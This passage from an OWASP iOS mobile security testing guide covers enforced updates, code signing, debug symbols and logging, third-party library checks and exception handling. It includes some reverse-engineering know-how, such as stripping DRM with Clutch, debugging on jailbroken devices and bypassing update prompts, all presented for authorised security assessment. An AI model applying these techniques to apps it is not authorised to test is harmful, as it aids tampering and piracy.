\paragraph{Dynamic Analysis}\label{dynamic-analysis-71}}

There are several ways to perform dynamic analysis:

\begin{itemize}
\tightlist
\item
  For the actual persistence: Use the techniques described in the ``Data
  Storage on iOS'' chapter.
\item
  For the serialization itself: Use a debug build or use Frida /
  objection to see how the serialization methods are handled (e.g.,
  whether the application crashes or extra information can be extracted
  by enriching the objects).
\end{itemize}

\hypertarget{testing-enforced-updating-mstg-arch-9-1}{%
\subsubsection{Testing enforced updating
(MSTG-ARCH-9)}\label{testing-enforced-updating-mstg-arch-9-1}}

Enforced updating can be really helpful when it comes to public key
pinning (see the Testing Network communication for more details) when a
pin has to be refreshed due to a certificate/public key rotation. Next,
vulnerabilities are easily patched by means of forced updates. The
challenge with iOS however, is that Apple does not provide any APIs yet
to automate this process, instead, developers will have to create their
own mechanism, such as described at various
\href{https://mobikul.com/show-update-application-latest-version-functionality-ios-app-swift-3/}{blogs}
which boil down to looking up properties of the app using
\texttt{http://itunes.apple.com/lookup\textbackslash{}?id\textbackslash{}\textless{}BundleId\textgreater{}}
or third party libaries, such as
\href{https://github.com/ArtSabintsev/Siren}{Siren} and
\href{https://www.npmjs.com/package/react-native-appstore-version-checker}{react-native-appstore-version-checker}.
Most of these implementations will require a certain given version
offered by an API or just ``latest in the appstore'', which means users
can be frustrated with having to update the app, even though no
business/security need for an update is truly there.

Please note that newer versions of an application will not fix security
issues that are living in the backends to which the app communicates.
Allowing an app not to communicate with it might not be enough. Having
proper API-lifecycle management is key here. Similarly, when a user is
not forced to update, do not forget to test older versions of your app
against your API and/or use proper API versioning.

\hypertarget{static-analysis-76}{%
\paragraph{Static Analysis}\label{static-analysis-76}}

First see whether there is an update mechanism at all: if it is not yet
present, it might mean that users cannot be forced to update. If the
mechanism is present, see whether it enforces ``always latest'' and
whether that is indeed in line with the business strategy. Otherwise
check if the mechanism is supporting to update to a given version. Make
sure that every entry of the application goes through the updating
mechanism in order to make sure that the update-mechanism cannot be
bypassed.

\hypertarget{dynamic-analysis-72}{%
\paragraph{Dynamic analysis}\label{dynamic-analysis-72}}

In order to test for proper updating: try downloading an older version
of the application with a security vulnerability, either by a release
from the developers or by using a third party app-store. Next, verify
whether or not you can continue to use the application without updating
it. If an update prompt is given, verify if you can still use the
application by canceling the prompt or otherwise circumventing it
through normal application usage. This includes validating whether the
backend will stop calls to vulnerable backends and/or whether the
vulnerable app-version itself is blocked by the backend. Finally, see if
you can play with the version number of a man-in-the-middled app and see
how the backend responds to this (and if it is recorded at all for
instance).

\hypertarget{references-22}{%
\subsubsection{References}\label{references-22}}

\begin{itemize}
\tightlist
\item
  {[}\#thiel2{]} David Thiel, iOS Application Security: The Definitive
  Guide for Hackers and Developers (Kindle Locations 3394-3399), No
  Starch Press, Kindle Edition.
\item
  Security Flaw with UIWebView -
  \url{https://medium.com/ios-os-x-development/security-flaw-with-uiwebview-95bbd8508e3c}
\item
  Learning about Universal Links and Fuzzing URL Schemes on iOS with
  Frida -
  \url{https://grepharder.github.io/blog/0x03_learning_about_universal_links_and_fuzzing_url_schemes_on_ios_with_frida.html}
\end{itemize}

\hypertarget{owasp-masvs-17}{%
\paragraph{OWASP MASVS}\label{owasp-masvs-17}}

\begin{itemize}
\tightlist
\item
  MSTG-ARCH-9: ``A mechanism for enforcing updates of the mobile app
  exists.''
\item
  MSTG-PLATFORM-1: ``The app only requests the minimum set of
  permissions necessary.''
\item
  MSTG-PLATFORM-3: ``The app does not export sensitive functionality via
  custom URL schemes, unless these mechanisms are properly protected.''
\item
  MSTG-PLATFORM-4: ``The app does not export sensitive functionality
  through IPC facilities, unless these mechanisms are properly
  protected.''
\item
  MSTG-PLATFORM-5: ``JavaScript is disabled in WebViews unless
  explicitly required.''
\item
  MSTG-PLATFORM-6: ``WebViews are configured to allow only the minimum
  set of protocol handlers required (ideally, only https is supported).
  Potentially dangerous handlers, such as file, tel and app-id, are
  disabled.''
\item
  MSTG-PLATFORM-7: ``If native methods of the app are exposed to a
  WebView, verify that the WebView only renders JavaScript contained
  within the app package.''
\item
  MSTG-PLATFORM-8: ``Object deserialization, if any, is implemented
  using safe serialization APIs.''
\end{itemize}

\hypertarget{tools-12}{%
\paragraph{Tools}\label{tools-12}}

\begin{itemize}
\tightlist
\item
  Apple App Site Association (AASA) Validator -
  \url{https://branch.io/resources/aasa-validator}
\item
  Frida - \url{https://www.frida.re/}
\item
  frida-trace - \url{https://www.frida.re/docs/frida-trace/}
\item
  IDB - \url{https://www.idbtool.com/}
\item
  Needle - \url{https://github.com/mwrlabs/needle}
\item
  Objection - \url{https://github.com/sensepost/objection}
\item
  ObjC Method Observer -
  \url{https://codeshare.frida.re/@mrmacete/objc-method-observer/}
\item
  Radare2 - \url{https://rada.re}
\end{itemize}

\hypertarget{regarding-object-persistence-in-ios}{%
\paragraph{Regarding Object Persistence in
iOS}\label{regarding-object-persistence-in-ios}}

\begin{itemize}
\tightlist
\item
  \url{https://developer.apple.com/documentation/foundation/NSSecureCoding}
\item
  \url{https://developer.apple.com/documentation/foundation/archives_and_serialization?language=swift}
\item
  \url{https://developer.apple.com/documentation/foundation/nskeyedarchiver}
\item
  \url{https://developer.apple.com/documentation/foundation/nscoding?language=swift}
\item
  \url{https://developer.apple.com/documentation/foundation/NSSecureCoding?language=swift}
\item
  \url{https://developer.apple.com/documentation/foundation/archives_and_serialization/encoding_and_decoding_custom_types}
\item
  \url{https://developer.apple.com/documentation/foundation/archives_and_serialization/using_json_with_custom_types}
\item
  \url{https://developer.apple.com/documentation/foundation/jsonencoder}
\item
  \url{https://medium.com/if-let-swift-programming/migrating-to-codable-from-nscoding-ddc2585f28a4}
\item
  \url{https://developer.apple.com/documentation/foundation/xmlparser}
\end{itemize}

\hypertarget{code-quality-and-build-settings-for-ios-apps}{%
\subsection{Code Quality and Build Settings for iOS
Apps}\label{code-quality-and-build-settings-for-ios-apps}}

\hypertarget{making-sure-that-the-app-is-properly-signed-mstg-code-1-1}{%
\subsubsection{Making Sure that the App Is Properly Signed
(MSTG-CODE-1)}\label{making-sure-that-the-app-is-properly-signed-mstg-code-1-1}}

\hypertarget{overview-69}{%
\paragraph{Overview}\label{overview-69}}

Code signing your app assures users that the app has a known source and
hasn't been modified since it was last signed. Before your app can
integrate app services, be installed on a device, or be submitted to the
App Store, it must be signed with a certificate issued by Apple. For
more information on how to request certificates and code sign your apps,
review the
\href{https://developer.apple.com/library/content/documentation/IDEs/Conceptual/AppDistributionGuide/Introduction/Introduction.html}{App
Distribution Guide.}

You can retrieve the signing certificate information from the
application's .app file with
\href{https://developer.apple.com/library/archive/documentation/Security/Conceptual/CodeSigningGuide/Procedures/Procedures.html}{codesign}.
Codesign is used to create, check, and display code signatures, as well
as inquire into the dynamic status of signed code in the system.

After you get the application's IPA file, re-save it as a ZIP file and
decompress the ZIP file. Navigate to the Payload directory, where the
application's .app file will be.

Execute the following \texttt{codesign} command to display the signing
information:

\begin{verbatim}
$ codesign -dvvv YOURAPP.app
Executable=/Users/Documents/YOURAPP/Payload/YOURAPP.app/YOURNAME
Identifier=com.example.example
Format=app bundle with Mach-O universal (armv7 arm64)
CodeDirectory v=20200 size=154808 flags=0x0(none) hashes=4830+5 location=embedded
Hash type=sha256 size=32
CandidateCDHash sha1=455758418a5f6a878bb8fdb709ccfca52c0b5b9e
CandidateCDHash sha256=fd44efd7d03fb03563b90037f92b6ffff3270c46
Hash choices=sha1,sha256
CDHash=fd44efd7d03fb03563b90037f92b6ffff3270c46
Signature size=4678
Authority=iPhone Distribution: Example Ltd
Authority=Apple Worldwide Developer Relations Certification Authority
Authority=Apple Root CA
Signed Time=4 Aug 2017, 12:42:52
Info.plist entries=66
TeamIdentifier=8LAMR92KJ8
Sealed Resources version=2 rules=12 files=1410
Internal requirements count=1 size=176
\end{verbatim}

There are various ways to distribute your app as described at
\href{https://developer.apple.com/business/distribute/}{the Apple
documentation}, which include using the App Store or via Apple Business
Manager for custom or in-house distribution. In case of an in-house
distribution scheme, make sure that no ad hoc certificates are used when
the app is signed for distribution.

\hypertarget{determining-whether-the-app-is-debuggable-mstg-code-2}{%
\subsubsection{Determining Whether the App is Debuggable
(MSTG-CODE-2)}\label{determining-whether-the-app-is-debuggable-mstg-code-2}}

\hypertarget{overview-70}{%
\paragraph{Overview}\label{overview-70}}

Debugging iOS applications can be done using Xcode, which embeds a
powerful debugger called lldb. Lldb is the default debugger since Xcode5
where it replaced GNU tools like gdb and is fully integrated in the
development environment. While debugging is a useful feature when
developing an app, it has to be turned off before releasing apps to the
App Store or within an enterprise program.

Generating an app in Build or Release mode depends on build settings in
Xcode; when an app is generated in Debug mode, a DEBUG flag is inserted
in the generated files.

\hypertarget{static-analysis-77}{%
\paragraph{Static Analysis}\label{static-analysis-77}}

At first you need to determine the mode in which your app is to be
generated to check the flags in the environment:

\begin{itemize}
\tightlist
\item
  Select the build settings of the project
\item
  Under `Apple LVM - Preprocessing' and `Preprocessor Macros', make sure
  `DEBUG' or `DEBUG\_MODE' is not selected (Objective-C)
\item
  Make sure that the ``Debug executable'' option is not selected.
\item
  Or in the `Swift Compiler - Custom Flags' section / `Other Swift
  Flags', make sure the `-D DEBUG' entry does not exist.
\end{itemize}

\hypertarget{dynamic-analysis-73}{%
\paragraph{Dynamic Analysis}\label{dynamic-analysis-73}}

Check whether you can attach a debugger directly, using Xcode. Next,
check if you can debug the app on a jailbroken device after Clutching
it. This is done using the debug-server which comes from the BigBoss
repository at Cydia.

Note: if the application is equipped with anti-reverse engineering
controls, then the debugger can be detected and stopped.

\hypertarget{finding-debugging-symbols-mstg-code-3}{%
\subsubsection{Finding Debugging Symbols
(MSTG-CODE-3)}\label{finding-debugging-symbols-mstg-code-3}}

\hypertarget{overview-71}{%
\paragraph{Overview}\label{overview-71}}

Generally, as little explanatory information as possible should be
provided with the compiled code. Some metadata (such as debugging
information, line numbers, and descriptive function or method names)
makes the binary or byte-code easier for the reverse engineer to
understand but isn't necessary in a release build. This metadata can
therefore be discarded without impacting the app's functionality.

These symbols can be saved in ``Stabs'' format or the DWARF format. In
the Stabs format, debugging symbols, like other symbols, are stored in
the regular symbol table. In the DWARF format, debugging symbols are
stored in a special ``\_\_DWARF'' segment within the binary. DWARF
debugging symbols can also be saved as a separate debug-information
file. In this test case, you make sure that no debug symbols are
contained in the release binary itself (in neither the symbol table nor
the \_\_DWARF segment).

\hypertarget{static-analysis-78}{%
\paragraph{Static Analysis}\label{static-analysis-78}}

Use gobjdump to inspect the main binary and any included dylibs for
Stabs and DWARF symbols.

\begin{verbatim}
$ gobjdump --stabs --dwarf TargetApp
In archive MyTargetApp:

armv5te:     file format mach-o-arm

aarch64:     file format mach-o-arm64
\end{verbatim}

Gobjdump is part of \href{https://www.gnu.org/s/binutils/}{binutils} and
can be installed on macOS via Homebrew.

Make sure that debugging symbols are stripped when the application is
being built for production. Stripping debugging symbols will reduce the
size of the binary and increase the difficulty of reverse engineering.
To strip debugging symbols, set
\texttt{Strip\ Debug\ Symbols\ During\ Copy} to \texttt{YES} via the
project's build settings.

A proper
\href{https://developer.apple.com/library/content/documentation/IDEs/Conceptual/AppDistributionGuide/AnalyzingCrashReports/AnalyzingCrashReports.html}{Crash
Reporter System} is possible because the system doesn't require any
symbols in the application binary.

\hypertarget{dynamic-analysis-74}{%
\paragraph{Dynamic Analysis}\label{dynamic-analysis-74}}

Dynamic analysis is not applicable for finding debugging symbols.

\hypertarget{finding-debugging-code-and-verbose-error-logging-mstg-code-4}{%
\subsubsection{Finding Debugging Code and Verbose Error Logging
(MSTG-CODE-4)}\label{finding-debugging-code-and-verbose-error-logging-mstg-code-4}}

\hypertarget{overview-72}{%
\paragraph{Overview}\label{overview-72}}

To speed up verification and get a better understanding of errors,
developers often include debugging code, such as verbose logging
statements (using \texttt{NSLog}, \texttt{println}, \texttt{print},
\texttt{dump}, and \texttt{debugPrint}) about responses from their APIs
and about their application's progress and/or state. Furthermore, there
may be debugging code for ``management-functionality'', which is used by
developers to set the application's state or mock responses from an API.
Reverse engineers can easily use this information to track what's
happening with the application. Therefore, debugging code should be
removed from the application's release version.

\hypertarget{static-analysis-79}{%
\paragraph{Static Analysis}\label{static-analysis-79}}

You can take the following static analysis approach for the logging
statements:

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  Import the application's code into Xcode.
\item
  Search the code for the following printing functions: \texttt{NSLog},
  \texttt{println}, \texttt{print}, \texttt{dump}, \texttt{debugPrint}.
\item
  When you find one of them, determine whether the developers used a
  wrapping function around the logging function for better mark up of
  the statements to be logged; if so, add that function to your search.
\item
  For every result of steps 2 and 3, determine whether macros or
  debug-state related guards have been set to turn the logging off in
  the release build. Please note the change in how Objective-C can use
  preprocessor macros:
\end{enumerate}

\begin{verbatim}
#ifdef DEBUG
    // Debug-only code
#endif
\end{verbatim}

The procedure for enabling this behavior in Swift has changed: you need
to either set environment variables in your scheme or set them as custom
flags in the target's build settings. Please note that the following
functions (which allow you to determine whether the app was built in the
Swift 2.1. release-configuration) aren't recommended, as Xcode 8 and
Swift 3 don't support these functions:

\begin{itemize}
\tightlist
\item
  \texttt{\_isDebugAssertConfiguration}
\item
  \texttt{\_isReleaseAssertConfiguration}
\item
  \texttt{\_isFastAssertConfiguration}.
\end{itemize}

Depending on the application's setup, there may be more logging
functions. For example, when
\href{https://github.com/CocoaLumberjack/CocoaLumberjack}{CocoaLumberjack}
is used, static analysis is a bit different.

For the ``debug-management'' code (which is built-in): inspect the
storyboards to see whether there are any flows and/or view-controllers
that provide functionality different from the functionality the
application should support. This functionality can be anything from
debug views to printed error messages, from custom stub-response
configurations to logs written to files on the application's file system
or a remote server.

As a developer, incorporating debug statements into your application's
debug version should not be a problem as long as you make sure that the
debug statements are never present in the application's release version.

In Objective-C, developers can use preprocessor macros to filter out
debug code:

\begin{verbatim}
#ifdef DEBUG
    // Debug-only code
#endif
\end{verbatim}

In Swift 2 (with Xcode 7), you have to set custom compiler flags for
every target, and compiler flags have to start with ``-D''. So you can
use the following annotations when the debug flag \texttt{DMSTG-DEBUG}
is set:

\begin{verbatim}
#if MSTG-DEBUG
    // Debug-only code
#endif
\end{verbatim}

In Swift 3 (with Xcode 8), you can set Active Compilation Conditions in
Build settings/Swift compiler - Custom flags. Instead of a preprocessor,
Swift 3 uses
\href{https://developer.apple.com/library/content/documentation/Swift/Conceptual/BuildingCocoaApps/InteractingWithCAPIs.html\#//apple_ref/doc/uid/TP40014216-CH8-ID34}{conditional
compilation blocks} based on the defined conditions:

\begin{verbatim}
#if DEBUG_LOGGING
    // Debug-only code
#endif
\end{verbatim}

\hypertarget{dynamic-analysis-75}{%
\paragraph{Dynamic Analysis}\label{dynamic-analysis-75}}

Dynamic analysis should be executed on both a simulator and a device
because developers sometimes use target-based functions (instead of
functions based on a release/debug-mode) to execute the debugging code.

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  Run the application on a simulator and check for output in the console
  during the app's execution.
\item
  Attach a device to your Mac, run the application on the device via
  Xcode, and check for output in the console during the app's execution
  in the console.
\end{enumerate}

For the other ``manager-based'' debug code: click through the
application on both a simulator and a device to see if you can find any
functionality that allows an app's profiles to be pre-set, allows the
actual server to be selected or allows responses from the API to be
selected.

\hypertarget{checking-for-weaknesses-in-third-party-libraries-mstg-code-5-1}{%
\subsubsection{Checking for Weaknesses in Third Party Libraries
(MSTG-CODE-5)}\label{checking-for-weaknesses-in-third-party-libraries-mstg-code-5-1}}

\hypertarget{overview-73}{%
\paragraph{Overview}\label{overview-73}}

iOS applications often make use of third party libraries which
accelerate development as the developer has to write less code in order
to solve a problem. However, third party libraries may contain
vulnerabilities, incompatible licensing, or malicious content.
Additionally, it is difficult for organizations and developers to manage
application dependencies, including monitoring library releases and
applying available security patches.

There are three widely used package management tools
\href{https://swift.org/package-manager}{Swift Package Manager},
\href{https://github.com/Carthage/Carthage}{Carthage}, and
\href{https://cocoapods.org}{CocoaPods}:

\begin{itemize}
\tightlist
\item
  The Swift Package Manager is open source, included with the Swift
  language, integrated into Xcode (since Xcode 11) and supports
  \href{https://developer.apple.com/documentation/swift_packages}{Swift,
  Objective-C, Objective-C++, C, and C++} packages. It is written in
  Swift, decentralized and uses the Package.swift file to document and
  manage project dependencies.
\item
  Carthage is open source and can be used for Swift and Objective-C
  packages. It is written in Swift, decentralized and uses the Cartfile
  file to document and manage project dependencies.
\item
  CocoaPods is open source and can be used for Swift and Objective-C
  packages. It is written in Ruby, utilizes a centralized package
  registry for public and private packages and uses the Podfile file to
  document and manage project dependencies.
\end{itemize}

There are two categories of libraries:

\begin{itemize}
\tightlist
\item
  Libraries that are not (or should not) be packed within the actual
  production application, such as \texttt{OHHTTPStubs} used for testing.
\item
  Libraries that are packed within the actual production application,
  such as \texttt{Alamofire}.
\end{itemize}

These libraries can lead to unwanted side-effects:

\begin{itemize}
\tightlist
\item
  A library can contain a vulnerability, which will make the application
  vulnerable. A good example is \texttt{AFNetworking} version 2.5.1,
  which contained a bug that disabled certificate validation. This
  vulnerability would allow attackers to execute man-in-the-middle
  attacks against apps that are using the library to connect to their
  APIs.
\item
  A library can no longer be maintained or hardly be used, which is why
  no vulnerabilities are reported and/or fixed. This can lead to having
  bad and/or vulnerable code in your application through the library.
\item
  A library can use a license, such as LGPL2.1, which requires the
  application author to provide access to the source code for those who
  use the application and request insight in its sources. In fact the
  application should then be allowed to be redistributed with
  modifications to its source code. This can endanger the intellectual
  property (IP) of the application.
\end{itemize}

Please note that this issue can hold on multiple levels: When you use
webviews with JavaScript running in the webview, the JavaScript
libraries can have these issues as well. The same holds for
plugins/libraries for Cordova, React-native and Xamarin apps.

\hypertarget{static-analysis-80}{%
\paragraph{Static Analysis}\label{static-analysis-80}}

\hypertarget{detecting-vulnerabilities-of-third-party-libraries-1}{%
\subparagraph{Detecting vulnerabilities of third party
libraries}\label{detecting-vulnerabilities-of-third-party-libraries-1}}

In order to ensure that the libraries used by the apps are not carrying
vulnerabilities, one can best check the dependencies installed by
CocoaPods or Carthage.

Swift Package Manager

In case \href{https://swift.org/package-manager}{Swift Package Manager}
is used for managing third party dependencies, the following steps can
be taken to analyze the third party libraries for vulnerabilities:

First, at the root of the project, where the Package.swift file is
located, type

\begin{verbatim}
$ swift build
\end{verbatim}

Next, check the file Package.resolved for the actual versions used and
inspect the given libraries for known vulnerabilities.

You can utilize the
\href{https://owasp.org/www-project-dependency-check/}{OWASP
Dependency-Check}'s experimental
\href{https://jeremylong.github.io/DependencyCheck/analyzers/swift.html}{Swift
Package Manager Analyzer} to identify the
\href{https://nvd.nist.gov/products/cpe}{Common Platform Enumeration
(CPE)} naming scheme of all dependencies and any corresponding
\href{https://cve.mitre.org/}{Common Vulnerability and Exposure (CVE)}
entries. Scan the application's Package.swift file and generate a report
of known vulnerable libraries with the following command:

\begin{verbatim}
$ dependency-check  --enableExperimental --out . --scan Package.swift
\end{verbatim}

CocoaPods

In case \href{https://cocoapods.org}{CocoaPods} is used for managing
third party dependencies, the following steps can be taken to analyze
the third party libraries for vulnerabilities.

First, at the root of the project, where the Podfile is located, execute
the following commands:

\begin{verbatim}
$ sudo gem install CocoaPods
$ pod install
\end{verbatim}

Next, now that the dependency tree has been built, you can create an
overview of the dependencies and their versions by running the following
commands:

\begin{verbatim}
$ sudo gem install cocoapods-dependencies
$ pod dependencies
\end{verbatim}

The result of the steps above can now be used as input for searching
different vulnerability feeds for known vulnerabilities.

\begin{quote}
Note:

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  If the developer packs all dependencies in terms of its own support
  library using a .podspec file, then this .podspec file can be checked
  with the experimental CocoaPods podspec checker.
\item
  If the project uses CocoaPods in combination with Objective-C,
  SourceClear can be used.
\item
  Using CocoaPods with HTTP-based links instead of HTTPS might allow for
  man-in-the-middle attacks during the download of the dependency,
  allowing an attacker to replace (parts of) the library with other
  content. Therefore, always use HTTPS.
\end{enumerate}
\end{quote}

You can utilize the
\href{https://owasp.org/www-project-dependency-check/}{OWASP
Dependency-Check}'s experimental
\href{https://jeremylong.github.io/DependencyCheck/analyzers/cocoapods.html}{CocoaPods
Analyzer} to identify the
\href{https://nvd.nist.gov/products/cpe}{Common Platform Enumeration
(CPE)} naming scheme of all dependencies and any corresponding
\href{https://cve.mitre.org/}{Common Vulnerability and Exposure (CVE)}
entries. Scan the application's *.podspec and/or Podfile.lock files and
generate a report of known vulnerable libraries with the following
command:

\begin{verbatim}
$ dependency-check  --enableExperimental --out . --scan Podfile.lock
\end{verbatim}

Carthage

In case \href{https://github.com/Carthage/Carthage}{Carthage} is used
for third party dependencies, then the following steps can be taken to
analyze the third party libraries for vulnerabilities.

First, at the root of the project, where the Cartfile is located, type

\begin{verbatim}
$ brew install carthage
$ carthage update --platform iOS
\end{verbatim}

Next, check the Cartfile.resolved for actual versions used and inspect
the given libraries for known vulnerabilities.

\begin{quote}
Note, at the time of writing this chapter, there is no automated support
for Carthage based dependency analysis known to the authors.
\end{quote}

Discovered library vulnerabilities

When a library is found to contain vulnerabilities, then the following
reasoning applies:

\begin{itemize}
\tightlist
\item
  Is the library packaged with the application? Then check whether the
  library has a version in which the vulnerability is patched. If not,
  check whether the vulnerability actually affects the application. If
  that is the case or might be the case in the future, then look for an
  alternative which provides similar functionality, but without the
  vulnerabilities.
\item
  Is the library not packaged with the application? See if there is a
  patched version in which the vulnerability is fixed. If this is not
  the case, check if the implications of the vulnerability for the build
  process. Could the vulnerability impede a build or weaken the security
  of the build-pipeline? Then try looking for an alternative in which
  the vulnerability is fixed.
\end{itemize}

In case frameworks are added manually as linked libraries:

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  Open the xcodeproj file and check the project properties.
\item
  Go to the tab \textbf{Build Phases} and check the entries in
  \textbf{Link Binary With Libraries} for any of the libraries. See
  earlier sections on how to obtain similar information using
  \href{https://github.com/MobSF/Mobile-Security-Framework-MobSF}{MobSF}.
\end{enumerate}

In the case of copy-pasted sources: search the header files (in case of
using Objective-C) and otherwise the Swift files for known method names
for known libraries.

Next, note that for hybrid applications, you will have to check the
JavaScript dependencies with RetireJS. Similarly for Xamarin, you will
have to check the C\# dependencies.

Last, if the application is a high-risk application, you will end up
vetting the library manually. In that case there are specific
requirements for native code, which are similar to the requirements
established by the MASVS for the application as a whole. Next to that,
it is good to vet whether all best practices for software engineering
are applied.

\hypertarget{detecting-the-licenses-used-by-the-libraries-of-the-application-1}{%
\subparagraph{Detecting the Licenses Used by the Libraries of the
Application}\label{detecting-the-licenses-used-by-the-libraries-of-the-application-1}}

In order to ensure that the copyright laws are not infringed, one can
best check the dependencies installed by Swift Packager Manager,
CocoaPods, or Carthage.

Swift Package Manager

When the application sources are available and Swift Package Manager is
used, execute the following code in the root directory of the project,
where the Package.swift file is located:

\begin{verbatim}
$ swift build
\end{verbatim}

The sources of each of the dependencies have now been downloaded to
\texttt{/.build/checkouts/} folder in the project. Here you can find the
license for each of the libraries in their respective folder.

CocoaPods

When the application sources are available and CocoaPods is used, then
execute the following steps to get the different licenses: First, at the
root of the project, where the Podfile is located, type

\begin{verbatim}
$ sudo gem install CocoaPods
$ pod install
\end{verbatim}

This will create a Pods folder where all libraries are installed, each
in their own folder. You can now check the licenses for each of the
libraries by inspecting the license files in each of the folders.

Carthage

When the application sources are available and Carthage is used, execute
the following code in the root directory of the project, where the
Cartfile is located:

\begin{verbatim}
$ brew install carthage
$ carthage update --platform iOS
\end{verbatim}

The sources of each of the dependencies have now been downloaded to
\texttt{Carthage/Checkouts} folder in the project. Here you can find the
license for each of the libraries in their respective folder.

Issues with library licenses

When a library contains a license in which the app's IP needs to be
open-sourced, check if there is an alternative for the library which can
be used to provide similar functionalities.

Note: In case of a hybrid app, please check the build-tools used: most
of them do have a license enumeration plugin to find the licenses being
used.

\hypertarget{dynamic-analysis-76}{%
\paragraph{Dynamic Analysis}\label{dynamic-analysis-76}}

The dynamic analysis of this section comprises of two parts: the actual
license verification and checking which libraries are involved in case
of missing sources.

It need to be validated whether the copyrights of the licenses have been
adhered to. This often means that the application should have an
\texttt{about} or \texttt{EULA} section in which the copy-right
statements are noted as required by the license of the third party
library.

When no source-code is available for library analysis, you can find some
of the frameworks being used with otool and MobSF. After you obtain the
library and Clutched it (e.g.~removed the DRM), you can run oTool with
the root of the application's directory:

\begin{verbatim}
$ otool -L <Executable>
\end{verbatim}

However, these do not include all the libraries being used. Next, with
class-dump (for Objective-C) or the more recent dsdump you can generate
a subset of the header files used and derive which libraries are
involved. But not detect the version of the library.

\begin{verbatim}
$ ./class-dump <Executable> -r
\end{verbatim}

\hypertarget{testing-exception-handling-mstg-code-6}{%
\subsubsection{Testing Exception Handling
(MSTG-CODE-6)}\label{testing-exception-handling-mstg-code-6}}

\hypertarget{overview-74}{%
\paragraph{Overview}\label{overview-74}}

Exceptions often occur after an application enters an abnormal or
erroneous state. Testing exception handling is about making sure that
the application will handle the exception and get into a safe state
without exposing any sensitive information via its logging mechanisms or
the UI.

Bear in mind that exception handling in Objective-C is quite different
from exception handling in Swift. Bridging the two approaches in an
application that is written in both legacy Objective-C code and Swift
code can be problematic.

\hypertarget{exception-handling-in-objective-c}{%
\subparagraph{Exception handling in
Objective-C}\label{exception-handling-in-objective-c}}

Objective-C has two types of errors:

\textbf{NSException} \texttt{NSException} is used to handle programming
and low-level errors (e.g., division by 0 and out-of-bounds array
access). An \texttt{NSException} can either be raised by \texttt{raise}
or thrown with \texttt{@throw}. Unless caught, this exception will
invoke the unhandled exception handler, with which you can log the
statement (logging will halt the program). \texttt{@catch} allows you to
recover from the exception if you're using a
\texttt{@try}-\texttt{@catch}-block:

\begin{verbatim}
 @try {
    //do work here
 }

@catch (NSException *e) {
    //recover from exception
}

@finally {
    //cleanup
\end{verbatim}

Bear in mind that using \texttt{NSException} comes with memory
management pitfalls: you need to
\href{https://developer.apple.com/library/content/documentation/Cocoa/Conceptual/Exceptions/Tasks/RaisingExceptions.html\#//apple_ref/doc/uid/20000058-BBCCFIBF}{clean
up allocations} from the try block that are in the
\href{https://developer.apple.com/library/content/documentation/Cocoa/Conceptual/Exceptions/Tasks/HandlingExceptions.html}{finally
block}. Note that you can promote \texttt{NSException} objects to
\texttt{NSError} by instantiating an \texttt{NSError} in the
\texttt{@catch} block.

\textbf{NSError} \texttt{NSError} is used for all other types of
\href{https://developer.apple.com/library/content/documentation/Cocoa/Conceptual/ProgrammingWithObjectiveC/ErrorHandling/ErrorHandling.html}{errors}.
Some Cocoa framework APIs provide errors as objects in their failure
callback in case something goes wrong; those that don't provide them
pass a pointer to an \texttt{NSError} object by reference. It is a good
practice to provide a \texttt{BOOL} return type to the method that takes
a pointer to an \texttt{NSError} object to indicate success or failure.
If there's a return type, make sure to return \texttt{nil} for errors.
If \texttt{NO} or \texttt{nil} is returned, it allows you to inspect the
error/reason for failure.

\hypertarget{exception-handling-in-swift}{%
\subparagraph{Exception Handling in
Swift}\label{exception-handling-in-swift}}

Exception handing in Swift (2 - 5) is quite different. The try-catch
block is not there to handle \texttt{NSException}. The block is used to
handle errors that conform to the \texttt{Error} (Swift 3) or
\texttt{ErrorType} (Swift 2) protocol. This can be challenging when
Objective-C and Swift code are combined in an application. Therefore,
\texttt{NSError} is preferable to \texttt{NSException} for programs
written in both languages. Furthermore, error-handling is opt-in in
Objective-C, but \texttt{throws} must be explicitly handled in Swift. To
convert error-throwing, look at the
\href{https://developer.apple.com/library/content/documentation/Swift/Conceptual/BuildingCocoaApps/AdoptingCocoaDesignPatterns.html}{Apple
documentation}. Methods that can throw errors use the \texttt{throws}
keyword. The \texttt{Result} type represents a success or failure, see
\href{https://developer.apple.com/documentation/swift/result}{Result},
\href{https://www.hackingwithswift.com/articles/161/how-to-use-result-in-swift}{How
to use Result in Swift 5} and
\href{https://www.swiftbysundell.com/posts/the-power-of-result-types-in-swift}{The
power of Result types in Swift}. There are four ways to
\href{https://developer.apple.com/library/content/documentation/Swift/Conceptual/Swift_Programming_Language/ErrorHandling.html}{handle
errors in Swift}:

\begin{itemize}
\tightlist
\item
  Propagate the error from a function to the code that calls that
  function. In this situation, there's no \texttt{do-catch}; there's
  only a \texttt{throw} throwing the actual error or a \texttt{try} to
  execute the method that throws. The method containing the \texttt{try}
  also requires the \texttt{throws} keyword:
\end{itemize}

\begin{verbatim}
func dosomething(argumentx:TypeX) throws {
    try functionThatThrows(argumentx: argumentx)
}
\end{verbatim}

\begin{itemize}
\item
  Handle the error with a \texttt{do-catch} statement. You can use the
  following pattern:

\begin{verbatim}
func doTryExample() {
    do {
        try functionThatThrows(number: 203)
    } catch NumberError.lessThanZero {
        // Handle number is less than zero
    } catch let NumberError.tooLarge(delta) {
        // Handle number is too large (with delta value)
    } catch {
        // Handle any other errors
    }
}

enum NumberError: Error {
    case lessThanZero
    case tooLarge(Int)
    case tooSmall(Int)
}

func functionThatThrows(number: Int) throws -> Bool {
    if number < 0 {
        throw NumberError.lessThanZero
    } else if number < 10 {
        throw NumberError.tooSmall(10 - number)
    } else if number > 100 {
        throw NumberError.tooLarge(100 - number)
    } else {
        return true
    }
}
\end{verbatim}
\item
  Handle the error as an optional value:

\begin{verbatim}
    let x = try? functionThatThrows()
    // In this case the value of x is nil in case of an error.
\end{verbatim}
\item
  Use the \texttt{try!} expression to assert that the error won't occur.
\item
  Handle the generic error as a \texttt{Result} return:
\end{itemize}

\begin{verbatim}
enum ErrorType: Error {
    case typeOne
    case typeTwo
}

func functionWithResult(param: String?) -> Result<String, ErrorType> {
    guard let value = param else {
        return .failure(.typeOne)
    }
    return .success(value)
}

func callResultFunction() {
    let result = functionWithResult(param: "OWASP")

    switch result {
    case let .success(value):
        // Handle success
    case let .failure(error):
        // Handle failure (with error)
    }
}
\end{verbatim}

